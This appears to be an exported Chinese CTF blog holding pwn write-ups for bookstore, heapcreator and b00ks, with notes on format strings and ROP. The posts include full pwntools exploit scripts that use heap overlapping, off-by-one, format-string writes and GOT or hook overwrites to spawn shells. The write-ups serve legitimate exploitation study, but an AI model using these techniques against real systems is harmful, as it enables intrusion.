是不是所有的系统调用函数内部都是通过syscall实现的。（我猜应该是的） gdb的print fun功能(直接打印函数fun的真实地址)和peda的find ‘’string’’ addr1 addr2(在addr1和addr2之间找string的位置。注意双引号不能换成单引号！) 劫持栈的gadget：p64(pop_rbp)+p64(fake_stack_addr)+p64(leave_addr) 64位通用gadgets的熟悉运用，定义函数(大致结构，具体因题而异)： 123456789101112#part1为地址大的，part2为地址小的。def call_fun(fun_addr，arg1，arg2，arg3): payload = p64(part1) payload+= p64(0) payload+= p64(1) payload+= p64(fun_addr) payload+= p64(arg1) payload+= p64(arg2) payload+= p64(arg3) payload+= p64(part2) payload+= 'a'*0x38 return payload p = process(‘./unexploitable’,env={‘LD_PRELOAD’ :’./libc_64.so.6’}) 用或不用LD_PRELOAD会影响动态链接加载的函数真实地址，最好看ida，最后一位不会变的。因为分页分配内存。 如果两次read()之间没有recv()的话，需要加一个sleep()，或者raw_input()来暂停一下，不然会有吞字的现象。 因为内存的分页分配机制，0x1000为最小单位，所以我们会发现我们的程序实际上只到0x601070(比如)，但之后到0x602000都是可写入的空的内存，我们可以任意使用（权限足够的话）。 one_gadgets 可以写入一个数组。orz.]]></content>
      <categories>
        <category>ctf-writeups</category>
      </categories>
      <tags>
        <tag>栈（rop高阶）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2015-9447ctf-search-engine-writeup]]></title>
    <url>%2F2019%2F04%2F01%2F2015-9447ctf-search-engine%2F</url>
    <content type="text"></content>
      <categories>
        <category>ctf-writeups</category>
      </categories>
      <tags>
        <tag>堆的利用（fastbin_attack）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2014-hacklu-oreo-writeup]]></title>
    <url>%2F2019%2F04%2F01%2F2014-hacklu-oreo%2F</url>
    <content type="text"></content>
      <categories>
        <category>ctf-writeups</category>
      </categories>
      <tags>
        <tag>堆的利用（fastbin_attack）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2015-hacklu-bookstore]]></title>
    <url>%2F2019%2F04%2F01%2F2015-hacklu-bookstore%2F</url>
    <content type="text"><![CDATA[首先提供题目的二进制文件：2015_hacklu 预览： 程序为64位，然后没有relro，没有pie，给调试带来很大方便。放进ida看看基本功能： 可以看到程序开始的时候已经在堆申请了三个堆块，且大小固定为0x80。 这里感觉怪怪的，s可以输入0x80个字符。。。。应该会有用处。 可以看到程序最后有一个格式化字符串漏洞，我们通过经验得知，通过精心构造格式化字符串可以实现任意地址读写功能。所以我们的问题关注点应该暂时放到如何构造格式化字符串中。 接着往下看，看完后发现实际上程序功能很简单，就两个小功能，一个输入任意字节的输入功能，一个free()功能（uaf没什么用。）。 暂时有用的漏洞就是格式化字符串漏洞和任意溢出漏洞。 漏洞如何利用： 以格式化字符串漏洞为主线索来逆向推理分析，如何控制dest？？？，我们发现程序中好像没有可以控制dest的功能（任意溢出漏洞虽然可以覆盖到，但是之后dest会被更新为固定的字符串）。。。真让人头秃，只有自己构造了。。。。然后发现最后一个功能里的v5指向的chunk的位置还未固定（malloc()从bins里找chunk，而bins里的chunk是可控的），所以我们可以利用任意溢出漏洞更改v7指向的chunk的大小为0x150，然后free()，再通过程序的malloc(0x140)来实现chunkoverlapping，从而使v5指向的地址位于dest地址前面，然后利用填充v5的机会构造dest。这里还需要注意的地方是free(2)的时候，因为大小属于small chunk所以会有两道检查，一个是防止和后一块合并，所以必须伪造后后一块，并使其prev_inuse位为1，另一个是后一块的prev_inuse位要为1。 相信大家都能注意到，就是程序运行了一次就结束了，而我们至少需要两次运行，一次leak，一次change，所以这里需要利用第一次的机会来将fini_arry0改为main_addr，并且泄露libc地址（main函数返回到__libc_start_main中，可以在格式化字符串前来下断点，通过查看栈的数据来查看偏移，进而获得libc地址。），现在还有一个问题是fini_arry0怎么输入进栈并且确定偏移？？？这里需要打破常规思维，需要改的数据可以不在格式化字符串里，只要偏移可以确定就行！，这时候就想到了之前的那个s给了0x80的空间，我们可以将fini_arry0输入到s里然后通过调试确定偏移。 如果我们这时候继续往下做的时候做到最后会发现一个问题：改过got表之后程序已经几乎结束，不会再调用函数了，所以改了也没用，所以我们只能改main函数返回地址为one_gadget了，这时候我们就要确定泄露一个和返回地址的地址相对偏移不变的值，经过观察发现有一个存在，然后泄露他。 第二次返回时我们的任务就变成了改ret_addr为one_gadget即可。只需要改后面的三个字节即可（可通过调试发现）。 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#coding:utf-8from pwn import *context(arch='amd64',os='linux')#context.log_level='debug'p=process('./books')P=ELF('./books')libc=ELF('./libc.so.6')#gdb.attach(p,'b *0x400c8e')#创建各个函数def edit(ID,des): p.recvuntil('5: Submit\n') p.sendline(str(ID)) p.recvuntil('er:\n') p.sendline(des)def delete(ID): p.recvuntil('5: Submit\n') p.sendline(str(ID+2))def submit(payload): p.recvuntil('5: Submit\n') p.sendline('5'+payload)#先构造chunk1造成over lapping 并且构造dest 两个目的：1.泄露__libc_main_ret#2.将fini_arry0改为main_addrfini_arry0=0x6011b8 #0x400830main_addr=0x400a39payload = '%'+str(0xa39)+'c%13$hn'+'.%31$p'+',%28$p'payload = payload.ljust(0x74,'a')payload = payload.ljust(0x80,'\x00')payload+= p64(0x90)payload+= p64(0x151)payload+= 'a'*0x140payload+= p64(0x150) payload+= p64(0x21) #为了bypass the check: !prev_inuse(next_chunk)payload+= 'a'*0x10payload+= p64(0x20)+p64(0x21) #为了使0x150的块不和nextchunk合并 #delete(2)edit(1,payload)delete(2)submit('aaaaaaa'+p64(fini_arry0))#submit('aaaaaaa')#gdb.attach(p)p.recvuntil('.')p.recvuntil('.')p.recvuntil('.')date = p.recv(14)p.recvuntil(',')ret_addr = p.recv(14)date =int(date,16) - 240ret_addr = int(ret_addr,16) - 0xd8 -0x110libcbase = date - libc.symbols['__libc_start_main']one_gadget = libcbase + 0x45216 #0x4526a 0xf02a4 0xf1147log.success('ret_addr = ' + hex(ret_addr))#raw_input()one_shot1 ='0x' + str(hex(one_gadget))[-2:]one_shot2 ='0x' + str(hex(one_gadget))[-6:-2]one_shot1 = int(one_shot1,16)one_shot2 = int(one_shot2,16)payload = '%' + str(one_shot1) + 'd%13$hhn'payload+= '%' + str(one_shot2-one_shot1) + 'd%14$hn'payload=payload.ljust(0x74,'a')payload=payload.ljust(0x80,'\x00')payload+=p64(0x90)payload+=p64(0x151)payload+= 'a'*0x140payload+= p64(0x150)payload+= p64(0x21)payload+= 'a'*0x10+p64(0x20)+p64(0x21)#delete(2)edit(1,payload)delete(2)submit('aaaaaaa'+p64(ret_addr)+p64(ret_addr+1))p.interactive() 我第一次做的时候的一些心得：2015_hacklu_bookstore: 这一题看似漏洞较多，但实际上难度不小，而且知识比较综合（有格式化字符串，堆栈的结合，overlapping，uaf等），利用起来很困难，费了很大劲才弄懂exp。还要感谢看雪的师傅。 学到的东西： 使程序再次运行的方法：改写fini_arry0的内容（一般在.fini_arry段中，在ida中ctrl+s寻找位置）为main_addr，可以再次运行，但只能用一次。 ida中使数字解析为字符串的方法，按r即可。 free(fast_bin（64位的极限是0x70）)时不需检查，而free(small_bin(64位是大于等于0x80))时，需要考虑几个因素： @1有可能会需要占位的堆块，防止被top chunk合并。 @2可能会造成unlink效应，注意构造时的size的inuse位，检查prev_chunk的占用情况，如果要unlink，两个堆块都要在small_bin的范围内。 @3会检查next_chunk(prev_inuse)的值是否为1,而next_chunk_addr=chunk_addr+chunk_size，chunk_size为自己构造，需注意。 利用overlapping构造格式化字符串来造成任意读写，得知偏移后提前构造栈的结构。 当通过格式化字符串获取任意写的功能时，除了向got表内写，还可以改写函数的返回地址为one_gadget（当然不一定能成功），这时就需要获取返回地址的地址，也就是栈中的某一个的地址，一般需要通过观察栈中数据是否有指向栈的并且和返回地址有固定的偏移，泄露其数值加上偏移即可得到返回地址的地址。 格式化字符串用%p打印出来的内容无需解包直接接受即可（所有内容都是字符，比如：0x600124则需要data=int(p.recv(8),16)），%s需要解包(接受时是以字符接受的，0x600124为data=u64(p.recv()[0:3].ljust(8,’\x00’)))。 [-2:]和[-2:0]的区别。。。 当利用改fini_arry0为main_addr而使程序再次回到开头时，程序的两次返回地址之间有一个固定的偏移。]]></content>
      <categories>
        <category>ctf-writeups</category>
      </categories>
      <tags>
        <tag>堆的利用（chunk_overlapping）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hitcontraning_lab13_writeup]]></title>
    <url>%2F2019%2F03%2F31%2Fhitcontraning-lab13-writeup%2F</url>
    <content type="text"><![CDATA[依然是wiki上的例题，先提供二进制源码：hitcontraning_lab13 预览： 文件是64位，partial relro则可以改写got表，感觉就像是堆题（名字也叫heapcreator）。。。没有pie调试起来会方便很多。。。然后放进ida64看一下大致功能。 前言分析：首先有两个setvbuf()设置好了标准输入和标准输出的缓冲区，所以程序不会在heap段设置chunk，然后打印一个菜单，之后就输入一个字符串，然后通过atoi()函数将字符串转换成数字，（这里可以想到如果将atoi_got改为system_addr后，直接输入‘/bin/sh\x00’就可以拿shell了），但是不幸的是他只可以输入4个字节。。。。但这一点后面能用上。 程序主要功能分析（寻找漏洞）：首先有四个主功能：create()，edit()，delete()，show()，当我们看到有edit和show存在的时候，这一题多半不会难，因为这两个函数为我们的泄露和篡改打下了基础，之后开始逐个分析。。 在create()中我们可以发现当输入size的时候调用atoi()的时候可以输入8个字符串！！！nice，我们的设想得到了成立！所以我们的目标设为改写atoi_got为system_addr。 在edit()功能中发现了off-by-one漏洞，通过这个我们可以实现chunk overlapping。 show()则是正常的打印内容。 delete()函数知识正常将chunk放入Bins，然后将指针归零，没有uaf漏洞。 利用漏洞来实现功能：leak: 想要leak出libc，先考虑常用的泄露got表地址，因为show()功能是打印heap的content指针所指向的内容，所以想办法将content指针改为atoi_got，然后再show就可以泄露出Libc。 利用chunk overlapping来进行chunk的覆盖重叠，申请两个chunk，第一个chunk的作用是来改第二个heap结构体的大小（可以设计好使其正好和top_chunk接轨就省去了nextchunk的prev_inuse检查，例如我是申请一个content大小为0x10的chunk，然后将heap结构体的大小改为0x40），然后delete以后其会被放入对应的fastbin中，然后再申请与其大小对应（0x30）的heap，使heap结构体0x10申请到的内存位于之前content位于的地方。这就形成了覆盖。（经典的与unlink类似的，我改我自己形式，即通过漏洞利用使一个结构体中的一个指针指向自己地址前方的不远处，通过向那个地址编辑内容来达到修改自己的目的。）如下图所示： 这就可以利用edit功能来改heap结构体的content指针。接着可以实现任意地址写的功能。 change: 泄露出libc以后就可以获得system_addr，然后利用任意地址写的功能将atoi_got改为system_addr，然后就利用之前说的方法来拿shell。 exp如下：两种思路，只讲了第一种，第二种类似，只不过利用的是free(addr_’/bin/sh\x00’)： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./heapcreator')P = ELF('./heapcreator')libc = ELF('./libc.so.6')atoi_got=P.got['atoi']#创建函数def create(size,payload): p.recvuntil(':') p.sendline('1') p.recvuntil(': ') p.sendline(str(size)) p.recvuntil(':') p.send(payload)def edit(ID,payload): p.recvuntil(':') p.sendline('2') p.recvuntil(':') p.sendline(str(ID)) p.recvuntil(': ') p.send(payload)def show(ID): p.recvuntil(':') p.sendline('3') p.recvuntil(':') p.sendline(str(ID))def delete(ID): p.recvuntil(':') p.sendline('4') p.recvuntil(':') p.sendline(str(ID))payload='a'*0x18create(0x18,payload)payload='a'*0x10create(0x10,payload)payload='a'*0x18+p8(0x40)edit(0,payload)delete(1)payload='a'*0x10 create(0x30,payload)#gdb.attach(p)payload='a'*0x10+p64(0)+p64(0x21)+p64(0x30)+p64(atoi_got)edit(1,payload)#gdb.attach(p)show(1)p.recvuntil('Content : ')atoi_addr = u64(p.recv(6).ljust(8,'\x00'))log.success('atoi_addr=' + hex(atoi_addr))#gdb.attach(p)libcbase = atoi_addr - libc.symbols['atoi']log.success('libcbase=' + hex(libcbase))system_addr=libcbase + libc.symbols['system']payload=p64(system_addr)edit(1,payload)p.recvuntil(':')p.sendline('1') p.recvuntil(': ')p.sendline('/bin/sh\x00')p.interactive() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#coding:utf-8from pwn import *context(os='linux',arch='amd64',timeout=1)p = process('./heapcreator')P = ELF('./heapcreator')libc = ELF('./libc.so.6')free_got=P.got['free']#创建函数def create(size,payload): p.recvuntil(':') p.sendline('1') p.recvuntil(': ') p.sendline(str(size)) p.recvuntil(':') p.sendline(payload)def edit(ID,payload): p.recvuntil(':') p.sendline('2') p.recvuntil(':') p.sendline(str(ID)) p.recvuntil(': ') p.sendline(payload)def show(ID): p.recvuntil(':') p.sendline('3') p.recvuntil(':') p.sendline(str(ID))def delete(ID): p.recvuntil(':') p.sendline('4') p.recvuntil(':') p.sendline(str(ID))#先创建两个堆块，让前面的off-by-one后面的create(0x18,'a'*4)create(0x10,'a'*4)edit(0,'/bin/sh\x00'+'a'*0x10+'\x41')#往fastbin送块delete(1)#再申请，使content覆盖heaparry[1]结构体的内容create(0x30,p64(0)*4+p64(0x30)+p64(free_got))#泄露libcshow(1)p.recvuntil('Content : ')free_addr=u64(p.recv()[0:6].ljust(8,'\x00'))log.success('free_addr=' + hex(free_addr))libcbase=free_addr-libc.symbols['free']system_addr=libcbase+libc.symbols['system']#将system_addr写入free_got里edit(1,p64(system_addr))delete(0)p.interactive() 我第一次做的时候的一些心得：hitconingtraining_lab13: 这一题难度不大，但是还是没有独立做出来，需要再独立处理一遍。 常见套路，申请书籍，然后用结构体储存书籍内容的指针和大小，结构体在堆上，书籍内容申请的空间也在堆上。 有edit和print功能说明不难，用edit向书籍的内容指针里任意写，所以想办法将内容指针改为free_got，再调用edit功能将其内容改为system_addr。 然后想改书籍的内容指针则需要控制结构体堆块，溢出和chunk overlapping都可以，溢出找不到，则为后者。 利用off_by_one漏洞和fast_bin的机制，更改size of 第二本书结构体堆块，用第二本书的内容控制结构体堆块内容，更改其为free_got，然后edit书籍二。 再考虑’/bin/sh’的位置，放在书籍一的内容里比较合适。system(addr_/bin/sh)，因为内容为/bin/sh所以free(ptr_des)的时候正好为system(addr__ /bin/sh)。]]></content>
      <categories>
        <category>ctf-writeups</category>
      </categories>
      <tags>
        <tag>堆的利用（chunk_overlapping）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2016-Asis-books_writeup]]></title>
    <url>%2F2019%2F03%2F31%2F2016-Asis-books-writeup%2F</url>
    <content type="text"><![CDATA[wiki上的一道经典例题，写wp的目的一方面是wiki上一些细节讲的有点不太清楚，一方面是自己巩固一下做过的题目，看是否是真的掌握。 首先提供题目二级制文件链接：books 预览：拿到题目先看基本信息： 可以看到题目是64位文件，所有保护全开，一般这种题目是堆题，且看到full relro则大概率是篡改malloc_hook。 然后运行一下，找到程序运行入口，然后放入ida里看反汇编码： 准备功能分析：（不要忽视，做的题多了会发现有时候这里可能存在关键漏洞）这里因为我已经做过了，所以函数名和一些变量名已经被我改成了对应的功能，可以看到程序开头先打印欢迎语，然后让我们输入作者（字符串储存在bss段，是可控的），这里的输入函数存在off-by-null漏洞，当输入32个字符时，既可以用来change，又可以用来leak(因为字符串后面没有‘\x00’，所以可以泄露authername这个字符串之后的内容直到’\x00’，这也是常见的套路。。。) 程序主功能分析：程序有五个功能：1.create 2.delete 3.edit 4.print 5.change_authorname，大致的整体功能实现就是用户申请书本，然后书的名字和内容大小都由我们自己来定，并将它们的内容存放在堆上，然后创建一个大小固定的Book结构体来储存被创建的book的信息，其也放在堆上，创建一个book以后堆上的结构和bss段的联系大概如下图所示： 紧接着删除功能删除booklist中的Book指针，并且将指针归0，没有uaf漏洞 然后edit功能就是将Book的des重新输入，没有漏洞 然后是print功能，打印书的ID,name,des和书的作者，这个漏洞之前提过，分析bss段的结构就可以发现打印作者使可以泄露第一个book指针，这里需要注意，因为之后的所有chunk大小我们都可以自己控制，所以经过简单的计算，就等于我们泄露了所有的book指针和name,des指针！！！这是解题的一个关键之处。 再之后是change_authorname功能，就是更改作者的名字，当输入32个字节时依然存在off-by-null漏洞（因为是off-by-null,不是off-by-one，所以难度会有所加大）。 漏洞利用思路：leak: 在前面已经提过，利用authorname最后一个字符’\x00’被book指针覆盖所以可以泄露book1指针的值，从而泄露之后所有的指针。 难点在于怎样泄露Libc，这里有一种新的方法，适用于chunk大小我们自己可控并且其地址可以泄露的情况，我们把book2的name和des申请的大于128KB（0x20000），则ptmalloc2将会用mmap来为我们分配内存，然而mmap的地址和libc的地址相对偏移不变（经过一次调试就能确定偏移），所以我们只要泄露了book2的name地址就等于泄露了libc，那再思考怎样泄露book2的name地址呢？现阶段我们只能利用程序自带的打印功能，他将打印所选的book的name指针和des指针所指向的内容，由book1指针已经由于off-by-null而最后一个字节被变为00，其之前肯定大于0，因为内存的分页分配机制，所以想让其被改过后的book1指针落入book1的des中，book1的des要相对的大一点。。。并且利用edit功能来重新编写book1的des，在book1指针指向的那个地方（这里的偏移不变，通过调试确定）伪造一个fake_book2_struct，其name指针为book2的name指针的地址（为addr_book1+56），然后利用打印功能来leak出book2的name指针的值，Libc泄露成功！！！ change:利用程序自带的edit功能来改malloc_hook为one_gadget（one_gadget需要多次尝试），因为我们已经可以掌控book1的des指针的值了，所以也就实现了任意地址写入。之后再次申请的时候就会触发malloc_hook拿到shell。 exp如下（我当时做的时候是改free_hook，具体的一些偏移量需要自己调试来确定，exp只提供思路！！！）：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#coding:utf-8from pwn import *context(os = 'linux',arch = 'amd64')context.log_level = 'debug'p=process('./b00ks')P=ELF('./b00ks')libc=ELF('./libc.so.6')#先创建每个函数def create(name_size,name,des_size,des): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil(': ') p.sendline(str(name_size)) p.recvuntil(': ') p.sendline(name) p.recvuntil(': ') p.sendline(str(des_size)) p.recvuntil(': ') p.sendline(des)def delete(ID): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil(': ') p.sendline(str(ID))def edit(ID,des): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil(': ') p.sendline(str(ID)) p.recvuntil(': ') p.sendline(des)def printf(ID): p.recvuntil('&gt; ') p.sendline('4') p.recvuntil(': ') for i in range(ID): book_id=p.recvline()[:-1] p.recvuntil(': ') book_name=p.recvline()[:-1] p.recvuntil(': ') book_des=p.recvline()[:-1] p.recvuntil(': ') book_author=p.recvline()[:-1] return book_id,book_name,book_des,book_authordef change(name): p.recvuntil('&gt; ') p.sendline('5') p.recvuntil(': ') p.sendline(name)#创建两个书本p.recvuntil(': ')p.sendline('a'*32)create(8,'a'*4,1024,'a'*8)create(0x21000,'b'*4,0x21000,'b'*8)#泄露第一个书本的地址book1_id,book1_name,book1_des,book1_author = printf(1)book1_addr=u64(book1_author[32:32+6].ljust(8,'\x00'))log.success('book1_addr=' + hex(book1_addr))#改第一个书的description为伪造的book2（name指针和des指针指向book2的name指针和des指针）payload='a'*0x3c0+p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xaaaa)edit(1,payload)#改名字覆盖book1的地址，使被覆盖的地址指向伪造的Bookchange('a'*32)#泄露libc地址和查看one_gadget地址offset=0x5b2010 #需要自己确定，变动较大。#one_gadget=0x45216one_gadget=0x4526a#one_gadget=0xf02a4#one_gadget=0xf1147book_id,book_name,book_des,book_author = printf(1)book2_name_addr=u64(book_name.ljust(8,'\x00'))log.success('book2_name_addr=' + hex(book2_name_addr))libcbase = book2_name_addr - offset#通过伪造的Book改book2的des指针，使其指向__free_hook, 通过edit功能将__free_hook改为one_gadget free_hook = libc.symbols['__free_hook'] + libcbase#binsh_addr=libc.search('/bin/sh').next() + libcbase#system_addr=libc.symbols['system'] + libcbaseedit(1,p64(free_hook))one_gadget_addr = one_gadget + libcbaseedit(2,p64(one_gadget_addr))#然后调用删除功能，调用free()函数delete(2)p.interactive() 第一次做的时候的一些心得:2016-Asis-b00ks: 个人感觉这一题难度较大（off-by-null），我对这别人wp才勉强看懂并且感觉思路比较巧妙，也获益匪浅，最后自己拿了shell也比较开心，起码证明自己真的懂了。。。。。想总结几个小的需要注意，很有可能成为阻碍我们做题的关键点。 关于调试：调试最好用gdb attach pid 在exp未成形之前，保证不要有语法错误，然后一点一点跟exp看数据行了，如果开了PIE的话，下断点要用基址（用vmmap看）+ida里的地址才是程序真正的虚拟地址。调试过程x/160xg addr 看bss段的数据或者堆的数据。 libc的偏移泄露新方法：mmap出来的地址和libc的地址相对位置不变。 除了用got表之外的新方法。 relro full 时虽然无法改got中的数据，但是可以改__free_hook(malloc同理） 在recvuntil()接收时一定要注意‘ ’和‘\n’的处理。。而且一般只要截取最后一个标点即可。 python的函数返回值可以有多个，同理也是可以多个接收。for i in range(整数)的巧妙运用也可以接收到自己想接收的数据。 泄露Libc’的思路可以为先想着泄露一块当前程序的一个地址（mmap地址或者堆的地址），然后通过gdb调试看某一次的程序来确定偏移（got则不需要），之后用泄露的地址加上偏移即可。 如果程序有对某一块内存写的功能函数，我们就可以想着控制这块内存的地址，进而造成任意内存写。 one_gadget的运用，暂时觉得可以逐个尝试，有可能需要构造rax rsp等等。调试问题还未解决]]></content>
      <categories>
        <category>ctf-writeups</category>
      </categories>
      <tags>
        <tag>堆的利用（off-by-one）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[格式化字符串小心得]]></title>
    <url>%2F2019%2F03%2F31%2F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B0%8F%E5%BF%83%E5%BE%97%2F</url>
    <content type="text"><![CDATA[格式化字符串的一些总结和心得： 虽然做的题目不多，但是还是有一点感悟，小总结一下。 格式化字符串漏洞可以实现的事情： 读（泄露函数地址），一般用于泄露出想要篡改的函数的got表的内容，也就是其真正的地址，需要ELF功能来获取got表地址，payload一般为‘%k$s’+p32(fun_got)，k为fun_got这个字符串所在位置的偏移，还要注意x86和x86-64的偏移计算方法的差别。 写（篡改）： 篡改某一个函数的got表内容，这个函数选择很重要，可能决定了exp的复杂程度： 当程序没有循环时，尽量选择printf()之后的函数，实在不行只能同时改两个地址，一个选择的函数的地址，一个fini_arry首元素的内容为start的地址，使程序重新运行。 当程序有循环时就无需那么麻烦。 看程序中有无system(‘/bin/sh’): 有的话难度较低，将printf之后的一个函数的got表改成system(‘/bin/sh’)的地址即可，再想办使这个函数被调用。 没有的话得先用读的功能泄露Libc版本，然后获取system函数的地址，这时候所选择函数必须是类似这种：puts(buf),printf(buf)这种，并且buf必须可输入，这样才可将buf改为‘/bin/sh’并调用system(‘/bin/sh’)。 特殊情况： 改写某一数据使其符合if语句条件从而调用if之后的system(‘/bin/sh’)。 改写printf函数的调用函数（不是main函数）的返回地址，使其返回到system(‘/bin/sh’)上。这里比较特殊，需要调用函数不太复杂，其中没有很多变量，才能使得其bp能在偏移中找到，然后才能确定offset。进而用读的方式获取返回地址，然后篡改。 利用形式： x86：单个改写可用fmtstr_payload=(k,{fun_got:sys_addr})，较简单。 x64：因为地址中带有‘\x00’所以直接用%k$lln改写时不能将p64(fun_got)放到‘%k$lln’前面，否则会截断，只能将其放在后面。或者采用$hn的方法改写尾部。 注意两个对齐：格式化字符串字节数与地址对齐，输出长度与改写数据对齐。]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn基础</tag>
        <tag>小心得</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[寒假小结]]></title>
    <url>%2F2019%2F03%2F31%2F%E5%AF%92%E5%81%87%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[寒假做的题目总结与反思：shellcode部分：BITSCTF 2017-Command_Line总结与不足： 题目较简单，接收缓冲区地址后算一下偏移量，直接将shellcode注入到返回地址之后，然后跳到那里即可。 BSides San Francisco CTF 2017-b_64_b_tuff总结与不足： 涉及到base64的问题，需要了解知识，只有字母和数字和+，/能参与base64编码，void( )(void )为函数强转，后直接调用。 需要先将shellcode编码为合法字符，在将base64解码后传输给进程，这里需要用到msfvenmo中的编码器，因为不知道什么原因我的虚拟机下载不了。但是用法及参数需要了解。。 CSAW Quals CTF 2017-pilot总结与不足： 题型有新意，设坑巧妙（也有可能是因为做题少第一次见），因为x64下的shellcode最短只能找到27位，大于24位，在其运行时尾部会被覆盖从而无法正常运行，需要将shellcode剪裁修改，加一些字节码，使其前后能够连接上。 jmp（短跳转）的字节码为EB,其偏移值是用其跳转的目的地址减去其下一条指令的起始地址。（还有其他的字节码，FF等） Openctf 2016-apprentice_wwwzon总结与不足： 知识储备不够，很多基础东西看不懂就很耽误时间和耐心，如： int型强转：_int8:强转为一字节（相当于a=a&amp;0xff） _int16强转为两字节 test表示and功能 常与jnz或jz一起用，用来看一个寄存器是不是0. mprotect()函数为改变内存某一区域的权限 str()函数和ord()函数的作用，需要自己试。。 源码看的不深刻，没有思路，还是只能干瞪眼，思路自己没有。 仍存在的问题：为什么sendline()中一定要用str强转，和scanf()有关么？把str(ord(shellcode[i]))直接变为shellcode[i]也不行。。 Openctf 2016-tyro_shellcode1总结与不足：可能是我水平太低这题的意图看的不太懂，觉得有点水。。。。直接放上shellcode后直接调用。。。 收获就是函数指针强转的形式：int（ p）(void* )为定义一个函数指针p，函数参数为void 型，返回值为int型，(int ( )(void *)p)() 的意义为将p强转为函数指针后调用函数。 rop部分：基本rop:sniperoj-pwn100-shellcode-x86-64:train.cs.nctu.edu.tw: ret2libctrain.cs.nctu.edu.tw: rop2013-PlaidCTF-ropasaurusrexDefcon 2015 Qualifier: R0pbaby中级rop:2016 XDCTF pwn1002016 华山杯 SU_PWNi春秋：RedHat 2017-pwn1： 巩固一下ret2libc3中的先向W区写入参数‘\bin\sh’然后再回到main调用system，但是到现在依然不明白为什么main函数返回以后padding要减8. 学会了Ctrl+s找RWX区，W存在可写入的区域。 养成context(os=’linux’,arch=‘’,timeout=1)的习惯。。。（没写timeout=1程序没反应，设置timeout=1就是为了防止程序假死，1秒之后将权限给下一行） scanf()要准备的参数顺序为横看顺序 bugs bunny ctf 2017-pwn150： 题型基础，简单的找system函数和参数，简单的rop寻找 学到的技巧：快捷键，D将指令解析为数据，C将数据解析为指令。（需先点击地址） 问题：为啥call system可以 放入system.plt却不行。 参数sh也可以开shell Tamu CTF 2018-pwn5： 题型基础，简单的系统调用 学到坏字符：\x0a,\x00等影响程序，和利用程序中自带的缓冲区输入/bin/sh。 Security Fest CTF 2016-tvstation未成功： 加深了对动态链接库的理解，其和elf文件一样也有代码段和数据段，可以适用于elf文件的一切命令。 如果题目给了库文件，则确定偏移是最重要的事，再确定库再内存中的开头实际地址。 有了库的开头之后就可以利用库中函数命令数据相对偏移不变的原理利用其中的命令（gadgets）和字符串等数据。 但是不知道为啥getshell不成功，感觉思路没问题。 LCTF 2016-pwn100未成功： 思路很清晰，是对特殊gadgets的考察，先用puts()函数泄露read函数的地址，用的是padding+p64(pop_rdi_addr)+p64(参数/是需要泄露的数值的地址)+p64(put_plt)+p64(start_addr/也就是返回地址)再确定Libc，确定system()的地址，然后用padding+p64(wanneng1)+[0，1，需要调用函数的got表地址，参数3，参数2，参数1]+p64(wanneng2)+’a’*56+p64(返回地址) 的布局来调用read()函数将/bin/sh读入，再调用system。 需要注意的两个地方是： puts()打印的结果带有换行符，接收时必须u64(p.recv()[:-1].ljust(8,’\x00’)),[:-1]是为了舍去最后的换行符，ljust(8,’\x00’)是为了时字节数为8个才能unpack。 /bin/sh字符串地址的选取，需要ctrl+s来选取w段，注意不能选取setbuf的段。（待进一步确定） 和上一题一样，不知道什么原因无法getshell。 TJCTF 2016-oneshot未成功： 学会使用工具one_gadget，其在libc.so文件中找execve(‘/bin/sh’)的跳板，但需要一定的条件。 思路是先用程序的读任意地址的内容功能泄露一个函数的got表内容，然后泄露one_gadget的实际地址，利用程序的第二个功能来直接跳到其位置。 不知道为什么exp运行不成功。 调整栈帧的技术：Alctf-2016-vss: 思路：因子函数的溢出长度不够。但是rop链长度较长，所以将rsp抬高，使其与main函数的输入点对接使rop能够延续。 收货以及需要注意的地方： 找栈溢出函数是最重要的事，一般来说一个变量位置为rbp-k，若k较大则溢出函数的可能性较小（根据可以输入的数据长度综合判断）。 syscall是在x86-64上进入内核模式的默认方式。该指令在Intel处理器上的32位操作模式下不可用。 sysenter是最常用于在32位操作模式下调用系统调用的指令。它类似于syscall，有点更难使用，但是这是内核的关注。int 0x80是一种调用系统调用的传统方法，应该避免 rsp抬升的高度一定要计算好（这一题还未算好，不知道为啥少了8字节）。 pwnable.kr-simplelogin: 更深的理解了stack pivot 在bss段构造了fake stack，有点绕的是虽然输入长度过段控制不了rip，但是漏洞函数返回地址正好是leave; retn;的地址！所以无需考虑这一点，直接用就行，还是需要先找清除漏洞函数和可以控制的数据长度，来判断使用什么方法来控制ip. base64编码以后数据长度会增加1/3。需引入base64模块，b64encode(payload)。 2018 安恒杯 over（未完成）： 再fake rbp之前构造fake stack进而构造rop链 但是怎么泄露的栈地址没有看懂。。。 X-CTF Quals 2016 - b0verfl0w： 题目简单但思想很深邃，首先看NX没开，想到用shellcode，再看可以溢出的长度，发现fake ebp之前有0x20的空间，fake eip之后只有14字节的空间，无法构造好的rop链，再用ROPgadget一搜索发现有jmp esp(只能搜操作符)，则想到调整栈帧，在fake eip之后为需要构造的命令，使eip跳到shellcode上去。 新姿势：可以自己编辑shellcode：sub_shellcode=asm(‘sub esp,0x28;jmp esp’) 格式化字符串：wiki:64 位程序格式化字符串漏洞： 明了自己要做的事是读还是写，读的话用$s，并且要找字符串地址的偏移，写的话要找字符串的偏移，不要弄混了。 hijack 